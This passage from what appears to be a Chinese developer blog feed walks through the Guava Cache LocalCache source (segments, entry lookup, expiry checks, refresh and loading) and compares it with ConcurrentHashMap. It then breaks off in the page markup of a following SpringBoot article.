<li>数组大小是 2 的幂次 ，并且小于并发度 concurrencyLevel ；</li>
<li>若指定了容量大小，数组大小乘以 20 要大于缓存权重 maxWeight （假如设置容量大小最大值为40，那么 maxWeight 为 40 ）。</li>
</ol>
<p>接下来，我们看看 Segment 类的核心属性 ：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segment</span>&lt;<span class="hljs-title class_">K</span>, <span class="hljs-title class_">V</span>&gt; <span class="hljs-title class_">extends</span> <span class="hljs-title class_">ReentrantLock</span> {
    <span class="hljs-comment">// 存活的元素大小</span>
    volatileint count;
    <span class="hljs-comment">// 存活的元素权重</span>
    long totalWeight;
    <span class="hljs-comment">//修改、更新的数量，用来做弱一致性</span>
    int modCount;
    <span class="hljs-comment">//扩容用</span>
    int threshold;
    <span class="hljs-comment">//存放Entry的数组，用来存放Entry，使用AtomicReferenceArray是因为要用CAS来保证原子性</span>
    volatile<span class="hljs-meta">@Nullable</span> <span class="hljs-type">AtomicReferenceArray</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; table;
     <span class="hljs-comment">//如果key是弱引用的话，那么被 GC 回收后，就会放到ReferenceQueue，要根据这个queue做一些清理工作</span>
    <span class="hljs-keyword">final</span><span class="hljs-meta">@Nullable</span> <span class="hljs-type">ReferenceQueue</span>&lt;<span class="hljs-type">K</span>&gt; keyReferenceQueue;
    <span class="hljs-comment">//如果value是弱引用的话，那么被 GC 回收后，就会放到ReferenceQueue，要根据这个queue做一些清理工作</span>
    <span class="hljs-keyword">final</span><span class="hljs-meta">@Nullable</span> <span class="hljs-type">ReferenceQueue</span>&lt;<span class="hljs-type">V</span>&gt; valueReferenceQueue;
    <span class="hljs-comment">//记录哪些entry被访问，用于accessQueue的更新。</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; recencyQueue;
    <span class="hljs-comment">// 读取次数计数器</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> readCount <span class="hljs-operator">=</span> new <span class="hljs-type">AtomicInteger</span>();
    <span class="hljs-comment">// 如果一个元素新写入，则会记到这个队列的尾部，用来做expire</span>
    <span class="hljs-meta">@GuardedBy</span>(<span class="hljs-string">"this"</span>)
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; writeQueue;
    <span class="hljs-comment">//读、写都会放到这个队列，用来进行LRU替换算法</span>
    <span class="hljs-meta">@GuardedBy</span>(<span class="hljs-string">"this"</span>)
    <span class="hljs-keyword">final</span> <span class="hljs-type">Queue</span>&lt;<span class="hljs-type">ReferenceEntry</span>&lt;<span class="hljs-type">K</span>, <span class="hljs-type">V</span>&gt;&gt; accessQueue;
}
</code></pre>
<p>ReferenceEntry 有几种引用类型 ：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db25f36f81234595bc30d407e2550ae1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=WQNGBaLBHdcTOMs85TLgPWd1Ht8%3D" alt="图片" loading="lazy"/></p>
<p>下图展示了 StringEntry 核心属性 ：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0610e9f087343948c292db384506d36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=CLrgGL%2BGobGICRg2%2B75AeNUImac%3D" alt="图片" loading="lazy"/></p>
<blockquote>
<p>每种 Entry 对象都有 Next 属性 ，指向下一个 Entry 。对象值 valueReference 默认是一个占位符 unSet ，表示没有被设置过值。</p>
</blockquote>
<h3 data-id="heading-13">4.3 查询流程</h3>
<p>进入 LoadingCache 的 get(key) 方法 ， 如下代码所示：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 1.调用LoadingCache的getOrLoad </span>
V <span class="hljs-built_in">getOrLoad</span>(K key) throws ExecutionException {
    return <span class="hljs-built_in">get</span>(key, defaultLoader);
}
<span class="hljs-comment">// 2.计算 key 的哈希值，并判断位于哪一个段 Segment，最后通过查询</span>
V <span class="hljs-built_in">get</span>(K key, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
    int hash = <span class="hljs-built_in">hash</span>(checkNotNull(key));
    return <span class="hljs-built_in">segmentFor</span>(hash)<span class="hljs-selector-class">.get</span>(key, hash, loader);
}
</code></pre>
<h4 data-id="heading-14">01 计算 key 对应的哈希值</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">hash</span>(<span class="hljs-variable">@Nullable</span> Object key) {
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">h</span> = <span class="hljs-selector-tag">keyEquivalence</span><span class="hljs-selector-class">.hash</span>(key);
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">rehash</span>(h);
}
</code></pre>
<h4 data-id="heading-15">02 定位分段 Segment</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function">Segment&lt;K, V&gt; <span class="hljs-title">segmentFor</span><span class="hljs-params">(<span class="hljs-type">int</span> hash)</span> </span>{
   <span class="hljs-comment">// segmentMask =  segmentCount - 1</span>
   <span class="hljs-keyword">return</span> segments[(hash &gt;&gt;&gt; segmentShift) &amp; segmentMask];
}
</code></pre>
<p>第二步骤，和 ConcurrentHashMap 类似，通过哈希值计算数据存储在哪一个分段 Segment 。</p>
<h4 data-id="heading-16">03 从定位的分段查询出对象</h4>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">get</span>(K key, int hash, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
      <span class="hljs-comment">// 判断 key、loader 是否为空 </span>
      <span class="hljs-built_in">checkNotNull</span>(key);
      <span class="hljs-built_in">checkNotNull</span>(loader);
      try {
        if (count != <span class="hljs-number">0</span>) { <span class="hljs-comment">// read-volatile</span>
          <span class="hljs-comment">// don't call getLiveEntry, which would ignore loading values</span>
          <span class="hljs-comment">// 根据hash定位到 table 的第一个 Entry</span>
          ReferenceEntry&lt;K, V&gt; e = <span class="hljs-built_in">getEntry</span>(key, hash);
          if (e != null) {
            <span class="hljs-comment">// 获取当前时间</span>
            long now = map<span class="hljs-selector-class">.ticker</span><span class="hljs-selector-class">.read</span>();
            <span class="hljs-comment">// 获取当前存活的 Value </span>
            V value = <span class="hljs-built_in">getLiveValue</span>(e, now);
            if (value != null) {
              <span class="hljs-comment">//记录被访问过</span>
              <span class="hljs-built_in">recordRead</span>(e, now);
              <span class="hljs-comment">//记录命中率</span>
              statsCounter<span class="hljs-selector-class">.recordHits</span>(<span class="hljs-number">1</span>);
              <span class="hljs-comment">//判断是否需要刷新，如果需要刷新，那么会去异步刷新，且返回旧值。</span>
              return <span class="hljs-built_in">scheduleRefresh</span>(e, key, hash, value, now, loader);
            }
            ValueReference&lt;K, V&gt; valueReference = e<span class="hljs-selector-class">.getValueReference</span>();
            <span class="hljs-comment">//如果 Entry 过期了且数据还在加载中，则等待直到加载完成。</span>
            if (valueReference.isLoading()) {
              return <span class="hljs-built_in">waitForLoadingValue</span>(e, key, valueReference);
            }
          }
        }
        <span class="hljs-comment">// at this point e is either null or expired;</span>
        <span class="hljs-comment">// 走到这一步表示: 之前没有写入过数据 || 数据已经过期 || 数据不是在加载中。</span>
        return <span class="hljs-built_in">lockedGetOrLoad</span>(key, hash, loader);
      } catch (ExecutionException ee) {
        Throwable cause = ee<span class="hljs-selector-class">.getCause</span>();
        if (cause instanceof Error) {
          thrownew <span class="hljs-built_in">ExecutionError</span>((Error) cause);
        } elseif (cause instanceof RuntimeException) {
          thrownew <span class="hljs-built_in">UncheckedExecutionException</span>(cause);
        }
        throw ee;
      } finally {
        <span class="hljs-built_in">postReadCleanup</span>();
      }
 }
</code></pre>
<h5 data-id="heading-17"><strong>A 定位第一个Entry</strong></h5>
<pre><code class="hljs language-ini" lang="ini">ReferenceEntry&lt;K, V&gt; getEntry(Object key, int hash) {
    for (ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">e</span> = getFirst(hash)<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
      // 判断哈希值
      if (e.getHash() != hash) {
        continue<span class="hljs-comment">;</span>
      }
      // 判断key
      K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
      if (<span class="hljs-attr">entryKey</span> == null) {
        tryDrainReferenceQueues()<span class="hljs-comment">;</span>
        continue<span class="hljs-comment">;</span>
      }
      if (map.keyEquivalence.equivalent(key, entryKey)) {
        return e<span class="hljs-comment">;</span>
      }
    }
    returnnull<span class="hljs-comment">;</span>
}
</code></pre>
<h6 data-id="heading-18">B 从第一个 Entry 获取存活的值</h6>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">getLiveValue</span>(ReferenceEntry&lt;K, V&gt; entry, long now) {
     if (entry.getKey() == null) {
        <span class="hljs-built_in">tryDrainReferenceQueues</span>();
        return null;
     }
     V value = entry<span class="hljs-selector-class">.getValueReference</span>()<span class="hljs-selector-class">.get</span>();
     if (value == null) {
       <span class="hljs-built_in">tryDrainReferenceQueues</span>();
       return null;
     }
     if (map.isExpired(entry, now)) {
       <span class="hljs-built_in">tryExpireEntries</span>(now);
       return null;
     }
     return value;
}

boolean <span class="hljs-built_in">isExpired</span>(ReferenceEntry&lt;K, V&gt; entry, long now) {
    <span class="hljs-built_in">checkNotNull</span>(entry);
    <span class="hljs-comment">// 如果配置了 expireAfterAccess ，比较当前时间和 Entry 的 accessTime 比较</span>
    if (expiresAfterAccess() &amp;&amp; (now - entry.getAccessTime() &gt;= expireAfterAccessNanos)) {
      returntrue;
    }
    <span class="hljs-comment">// 如果配置了 expireAfterWrite ，比较当前时间和 Entry 的 writeTime 比较</span>
    if (expiresAfterWrite() &amp;&amp; (now - entry.getWriteTime() &gt;= expireAfterWriteNanos)) {
      returntrue;
    }
    returnfalse;
}
</code></pre>
<blockquote>
<p>假如 Entry 的 key 为空，或者 vlaue 为空，或者过期了，则返回空 。</p>
</blockquote>
<h5 data-id="heading-19">C 调度刷新 scheduleRefresh</h5>
<pre><code class="hljs language-java" lang="java">V <span class="hljs-title function_">scheduleRefresh</span><span class="hljs-params">(
        ReferenceEntry&lt;K, V&gt; entry,
        K key,
        <span class="hljs-type">int</span> hash,
        V oldValue,
        <span class="hljs-type">long</span> now,
        CacheLoader&lt;? <span class="hljs-built_in">super</span> K, V&gt; loader)</span> {
       <span class="hljs-comment">//1、是否配置了 refreshAfterWrite</span>
       <span class="hljs-comment">//2、用 writeTime 判断是否达到刷新的时间</span>
       <span class="hljs-comment">//3、是否在加载中，如果是则没必要再进行刷新</span>
      <span class="hljs-keyword">if</span> (map.refreshes()
          &amp;&amp; (now - entry.getWriteTime() &gt; map.refreshNanos)
          &amp;&amp; !entry.getValueReference().isLoading()) {
          <span class="hljs-type">V</span> <span class="hljs-variable">newValue</span> <span class="hljs-operator">=</span> refresh(key, hash, loader, <span class="hljs-literal">true</span>);
          <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>) {
              <span class="hljs-keyword">return</span> newValue;
          }
      }
     <span class="hljs-keyword">return</span> oldValue;
}
</code></pre>
<p>调度刷新方法会判断三个条件 ：</p>
<ul>
<li>配置了刷新时间 refreshAfterWrite</li>
<li>当前时间减去 Entry 的写入时间大于刷新时间</li>
<li>当前 Entry 未处于加载中</li>
</ul>
<p>当满足了三个条件之后，调用 refresh 方法，当异步加载成功后，返回新值。</p>
<pre><code class="hljs language-scss" lang="scss">V <span class="hljs-built_in">refresh</span>(K key, int hash, CacheLoader&lt;? super K, V&gt; loader, boolean checkTime) {
     <span class="hljs-comment">//插入一个 LoadingValueReference ，实质是把对应Entry的ValueReference替换为新建的LoadingValueReference</span>
     final LoadingValueReference&lt;K, V&gt; loadingValueReference =
         <span class="hljs-built_in">insertLoadingValueReference</span>(key, hash, checkTime);
     if (loadingValueReference == null) {
       returnnull;
     }
     <span class="hljs-comment">// 调用异步加载方法loadAsync</span>
     ListenableFuture&lt;V&gt; result = <span class="hljs-built_in">loadAsync</span>(key, hash, loadingValueReference, loader);
     if (result.isDone()) {
       try {
         return Uninterruptibles<span class="hljs-selector-class">.getUninterruptibly</span>(result);
       } catch (Throwable t) {
         <span class="hljs-comment">// don't let refresh exceptions propagate; error was already logged</span>
       }
     }
     returnnull;
}
</code></pre>
<p>首先将 Entry 对象的 ValueReference 包装为新建的 LoadingValueReference , 表明当前对象正在加载中。</p>
<pre><code class="hljs language-ini" lang="ini">LoadingValueReference&lt;K, V&gt; insertLoadingValueReference(
        final K key, final int hash, boolean checkTime) {
      ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">e</span> = null<span class="hljs-comment">;</span>
      lock()<span class="hljs-comment">;</span>
      try {
        long <span class="hljs-attr">now</span> = map.ticker.read()<span class="hljs-comment">;</span>
        preWriteCleanup(now)<span class="hljs-comment">;</span>
        AtomicReferenceArray&lt;ReferenceEntry&lt;K, V&gt;&gt; <span class="hljs-attr">table</span> = this.table<span class="hljs-comment">;</span>
        int <span class="hljs-attr">index</span> = hash &amp; (table.length() - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
        ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">first</span> = table.get(index)<span class="hljs-comment">;</span>
        // Look for an existing entry.
        for (<span class="hljs-attr">e</span> = first<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
          K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
          if (e.getHash() == hash
              &amp;&amp; entryKey != null
              &amp;&amp; map.keyEquivalence.equivalent(key, entryKey)) {
            // We found an existing entry.
            ValueReference&lt;K, V&gt; <span class="hljs-attr">valueReference</span> = e.getValueReference()<span class="hljs-comment">;</span>
            if (valueReference.isLoading()
                || (checkTime &amp;&amp; (now - e.getWriteTime() &lt; map.refreshNanos))) {
              // refresh is a no-op if loading is pending
              // if checkTime, we want to check *after* acquiring the lock if refresh still needs
              // to be scheduled
              returnnull<span class="hljs-comment">;</span>
            }
            // continue returning old value while loading
            ++modCount<span class="hljs-comment">;</span>
            LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> =
                new LoadingValueReference&lt;&gt;(valueReference)<span class="hljs-comment">;</span>
            e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
            return loadingValueReference<span class="hljs-comment">;</span>
          }
        }
        ++modCount<span class="hljs-comment">;</span>
        LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> = new LoadingValueReference&lt;&gt;()<span class="hljs-comment">;</span>
        <span class="hljs-attr">e</span> = newEntry(key, hash, first)<span class="hljs-comment">;</span>
        e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
        table.set(index, e)<span class="hljs-comment">;</span>
        return loadingValueReference<span class="hljs-comment">;</span>
      } finally {
        unlock()<span class="hljs-comment">;</span>
        postWriteCleanup()<span class="hljs-comment">;</span>
      }
}
</code></pre>
<p>接下来，分析异步加载<code>loadAsync</code>方法：</p>
<pre><code class="hljs language-scss" lang="scss">ListenableFuture&lt;V&gt; <span class="hljs-built_in">loadAsync</span>(
        final K key,
        final int hash,
        final LoadingValueReference&lt;K, V&gt; loadingValueReference,
        CacheLoader&lt;? super K, V&gt; loader) {
      final ListenableFuture&lt;V&gt; loadingFuture = loadingValueReference<span class="hljs-selector-class">.loadFuture</span>(key, loader);
      loadingFuture<span class="hljs-selector-class">.addListener</span>(
          new Runnable() {
            <span class="hljs-keyword">@Override</span>
            public void run() {
              try {
                <span class="hljs-built_in">getAndRecordStats</span>(key, hash, loadingValueReference, loadingFuture);
              } catch (Throwable t) {
                logger<span class="hljs-selector-class">.log</span>(Level.WARNING, "Exception thrown during refresh", t);
                loadingValueReference<span class="hljs-selector-class">.setException</span>(t);
              }
            }
          },
          <span class="hljs-built_in">directExecutor</span>());
      return loadingFuture;
}

public ListenableFuture&lt;V&gt; <span class="hljs-built_in">loadFuture</span>(K key, CacheLoader&lt;? super K, V&gt; loader) {
      try {
        <span class="hljs-comment">// 记录耗时时间 </span>
        stopwatch<span class="hljs-selector-class">.start</span>();
        V previousValue = oldValue<span class="hljs-selector-class">.get</span>();
        if (previousValue == null) {
          V newValue = loader<span class="hljs-selector-class">.load</span>(key);
          return <span class="hljs-built_in">set</span>(newValue) ? futureValue : Futures.<span class="hljs-built_in">immediateFuture</span>(newValue);
        }
        ListenableFuture&lt;V&gt; newValue = loader<span class="hljs-selector-class">.reload</span>(key, previousValue);
        if (newValue == null) {
          return Futures<span class="hljs-selector-class">.immediateFuture</span>(null);
        }
        <span class="hljs-comment">// To avoid a race, make sure the refreshed value is set into loadingValueReference</span>
        <span class="hljs-comment">// *before* returning newValue from the cache query.</span>
        return <span class="hljs-attribute">transform</span>(
            newValue,
            new com.google.common.base.Function&lt;V, V&gt;() {
              <span class="hljs-keyword">@Override</span>
              public V apply(V newValue) {
                LoadingValueReference<span class="hljs-selector-class">.this</span><span class="hljs-selector-class">.set</span>(newValue);
                return newValue;
              }
            },
            <span class="hljs-built_in">directExecutor</span>());
      } catch (Throwable t) {
        ListenableFuture&lt;V&gt; result = <span class="hljs-built_in">setException</span>(t) ? futureValue : <span class="hljs-built_in">fullyFailedFuture</span>(t);
        if (t instanceof InterruptedException) {
          Thread<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.interrupt</span>();
        }
        return result;
      }
 }
</code></pre>
<p>loadAsync 方法流程：</p>
<ol>
<li>调用 loadingValueReference 对象的 loadFuture 方法，假如旧数据为空值，则同步调用加载器 loader 的 load 方法 ，并返回包装了新值的 Future 。</li>
<li>假如旧数据不为空值，则调用加载器 loader 的 reload 方法（<strong>此处可以重新实现为异步的方式</strong>），经过转换操作返回包装了新值的 Future 。</li>
<li>将新的值存储在 Entry 对象里。</li>
</ol>
<h6 data-id="heading-20">D 查询/加载 lockedGetOrLoad</h6>
<p>如果之前没有写入过数据 、 数据已经过期、 数据不是在加载中，则会调用<code>lockedGetOrLoad</code>方法。</p>
<pre><code class="hljs language-ini" lang="ini">V lockedGetOrLoad(K key, int hash, CacheLoader&lt;? super K, V&gt; loader) throws ExecutionException {
    ReferenceEntry&lt;K, V&gt; e<span class="hljs-comment">;</span>
    ValueReference&lt;K, V&gt; <span class="hljs-attr">valueReference</span> = null<span class="hljs-comment">;</span>
    LoadingValueReference&lt;K, V&gt; <span class="hljs-attr">loadingValueReference</span> = null<span class="hljs-comment">;</span>
    //用来判断是否需要创建一个新的Entry
    boolean <span class="hljs-attr">createNewEntry</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    //segment上锁
    lock()<span class="hljs-comment">;</span>
    try {
      // re-read ticker once inside the lock
      long <span class="hljs-attr">now</span> = map.ticker.read()<span class="hljs-comment">;</span>
      //做一些清理工作
      preWriteCleanup(now)<span class="hljs-comment">;</span>

      int <span class="hljs-attr">newCount</span> = this.count - <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      AtomicReferenceArray&lt;ReferenceEntry&lt;K, V&gt;&gt; <span class="hljs-attr">table</span> = this.table<span class="hljs-comment">;</span>
      int <span class="hljs-attr">index</span> = hash &amp; (table.length() - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
      ReferenceEntry&lt;K, V&gt; <span class="hljs-attr">first</span> = table.get(index)<span class="hljs-comment">;</span>

      //通过key定位entry
      for (<span class="hljs-attr">e</span> = first<span class="hljs-comment">; e != null; e = e.getNext()) {</span>
        K <span class="hljs-attr">entryKey</span> = e.getKey()<span class="hljs-comment">;</span>
        if (e.getHash() == hash
            &amp;&amp; entryKey != null
            &amp;&amp; map.keyEquivalence.equivalent(key, entryKey)) {
          //找到entry
          <span class="hljs-attr">valueReference</span> = e.getValueReference()<span class="hljs-comment">;</span>
          //如果value在加载中则不需要重复创建entry
          if (valueReference.isLoading()) {
            <span class="hljs-attr">createNewEntry</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
          } else {
            V <span class="hljs-attr">value</span> = valueReference.get()<span class="hljs-comment">;</span>
            //value为null说明已经过期且被清理掉了
            if (<span class="hljs-attr">value</span> == null) {
              //写通知queue
              enqueueNotification(
                  entryKey, hash, value, valueReference.getWeight(), RemovalCause.COLLECTED)<span class="hljs-comment">;</span>
            //过期但还没被清理
            } elseif (map.isExpired(e, now)) {
              //写通知queue
              // This is a duplicate check, as preWriteCleanup already purged expired
              // entries, but let's accomodate an incorrect expiration queue.
              enqueueNotification(
                  entryKey, hash, value, valueReference.getWeight(), RemovalCause.EXPIRED)<span class="hljs-comment">;</span>
            } else {
              recordLockedRead(e, now)<span class="hljs-comment">;</span>
              statsCounter.recordHits(1)<span class="hljs-comment">;</span>
              //其他情况则直接返回value
              //来到这步，是不是觉得有点奇怪，我们分析一下: 
              //进入lockedGetOrLoad方法的条件是数据已经过期 || 数据不是在加载中，但是在lock之前都有可能发生并发，进而改变entry的状态，所以在上面中再次判断了isLoading和isExpired。所以来到这步说明，原来数据是过期的且在加载中，lock的前一刻加载完成了，到了这步就有值了。
              return value<span class="hljs-comment">;</span>
            }
            writeQueue.remove(e)<span class="hljs-comment">;</span>
            accessQueue.remove(e)<span class="hljs-comment">;</span>
            <span class="hljs-attr">this.count</span> = newCount<span class="hljs-comment">; // write-volatile</span>
          }
          break<span class="hljs-comment">;</span>
        }
      }
      //创建一个Entry，且set一个新的 LoadingValueReference。
      if (createNewEntry) {
        <span class="hljs-attr">loadingValueReference</span> = new LoadingValueReference&lt;&gt;()<span class="hljs-comment">;</span>

        if (<span class="hljs-attr">e</span> == null) {
          <span class="hljs-attr">e</span> = newEntry(key, hash, first)<span class="hljs-comment">;</span>
          e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
          table.set(index, e)<span class="hljs-comment">;</span>
        } else {
          e.setValueReference(loadingValueReference)<span class="hljs-comment">;</span>
        }
      }
    } finally {
      unlock()<span class="hljs-comment">;</span>
      postWriteCleanup()<span class="hljs-comment">;</span>
    }
    //同步加载数据
    if (createNewEntry) {
      try {
        synchronized (e) {
          return loadSync(key, hash, loadingValueReference, loader)<span class="hljs-comment">;</span>
        }
      } finally {
        statsCounter.recordMisses(1)<span class="hljs-comment">;</span>
      }
    } else {
      // The entry already exists. Wait for loading.
      return waitForLoadingValue(e, key, valueReference)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h2 data-id="heading-21">5 总结</h2>
<p>通过解析 Guava Cache 的实现原理，我们发现 Guava LocalCache 与 ConcurrentHashMap 有以下不同：</p>
<ol>
<li>
<p>ConcurrentHashMap ”分段控制并发“是隐式的（实现中没有Segment对象），而 LocalCache 是显式的。</p>
<p>在 JDK 1.8 之后，ConcurrentHashMap 采用<code>synchronized + CAS</code> 实现：当 put 的元素在哈希桶数组中不存在时，直接 CAS 进行写操作；在发生哈希冲突的情况下使用 synchronized 锁定头节点。其实是比分段锁更细粒度的锁实现，只在特定场景下锁定其中一个哈希桶，降低锁的影响范围。</p>
</li>
<li>
<p>Guava Cache 使用 ReferenceEntry 来封装键值对，并且对于值来说，还额外实现了 ValueReference 引用对象来封装对应 Value 对象。</p>
</li>
<li>
<p>Guava Cache 支持过期 + 自动 loader 机制，这也使得其加锁方式与 ConcurrentHashMap 不同。</p>
</li>
<li>
<p>Guava Cache 支持 segment 粒度上支持了 LRU 机制， 体现在 Segment 上就是 writeQueue 和 accessQueue。</p>
<p>队列中的元素按照访问或者写时间排序，新的元素会被添加到队列尾部。如果，在队列中已经存在了该元素，则会先delete掉，然后再尾部添加该节点。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot实现隐式参数注入]]></title>    <link>https://juejin.cn/post/7591942733365231650</link>    <guid>https://juejin.cn/post/7591942733365231650</guid>    <pubDate>2026-01-06T07:03:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733365231650" data-draft-id="7591942733365149730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot实现隐式参数注入"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-06T07:03:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot实现隐式参数注入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:03:18.000Z" title="Tue Jan 06 2026 07:03:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 